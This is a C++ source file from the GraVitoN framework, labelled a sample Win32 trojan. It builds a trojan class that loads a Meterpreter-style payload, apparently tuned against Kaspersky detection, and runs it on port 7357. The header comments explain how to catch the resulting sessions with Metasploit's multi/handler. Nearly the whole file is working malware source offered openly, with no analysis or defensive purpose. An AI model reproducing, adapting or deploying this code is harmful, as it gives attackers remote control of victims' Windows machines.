/**
 * @file
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 * 
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief GraVitoN Sample Win32 Trojan
 *
 * @section Note
 * 1. Disable g++ optimization (make <...> CPPFLAGS=-O0 |or| g++ <..> -O0) \n
 * 2. If you are using msfconsole/exploit/multi/handler, push Ctrl+Z in case of sending a session to background. \n
 */

/// Activate/Deactivate GraVitoN logger
//#define GVN_ACTIVATE_LOGGER
/// Print logs into a file
//#define GVN_LOG_INTO_FILE
/// Path to Log File
//#define GVN_LOG_FILE "./graviton_logs.txt"


//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
#include <windows.h>
#include "../../../graviton.hpp"
#include "../../../gvn_payload/windows/gvn_payload_meter_w32b_kasper.hpp"
#include "../../../gvn_ai/gvn_ai_trojan_sample.hpp"
#include <iostream>
using namespace std;

class My_Trojan_AI : public AI_Trojan_Sample
{
protected:
	virtual bool initializeInternalComponents()
	{
		payload = new Payload_Meter_W32b_Kasper();
		payload->initialize(options);
	}
};

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
int WinMain(HINSTANCE inst, HINSTANCE previ, LPSTR cmd, int ncmd)
{
	GraVitoN::Logger::logItLn ( "main -> AI" );

	My_Trojan_AI ai;

	ai.initialize("PORT=7357");
    ai.run();

    GraVitoN::Logger::logItLn ( "main -> done" );
	
    return 0;
}
